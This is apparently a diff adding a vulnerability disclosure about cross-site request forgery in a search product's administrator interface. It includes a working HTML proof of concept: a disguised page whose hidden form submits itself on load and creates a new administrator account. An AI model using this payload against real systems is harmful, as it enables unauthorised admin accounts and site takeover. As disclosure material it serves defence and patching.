@@ -1,0 +1,24 @@
+The forms in the administrator interface are not protected against XSRF. The 
+attacker can do any action in the context of the victim. 
+
+An example attack scenario could be:
+The attacker creates a malicious website with a prepared form to add a new
+user, which will be submitted on load. 
+
+
+Exploit to add an admin user:
+<html>
+  <head><title>Some seemingly benign web-site</title></head>
+  <body onLoad="document.forms[0].submit();">
+
+    <form method="post"
+  action="http://omnifind-host/ESAdmin/security.do">
+      <input type="hidden" name="command" value="saveNewUser"/>
+      <input type="hidden" name="user.name" value="joemueller"/>
+      <input type="hidden" name="user.role" value="0"/>
+      <input type="hidden" name="user.allCollections" value="true"/>
+      <input type="hidden" name="apply" value="OK"/>
+    </form>
+  </body>
+</html>
+
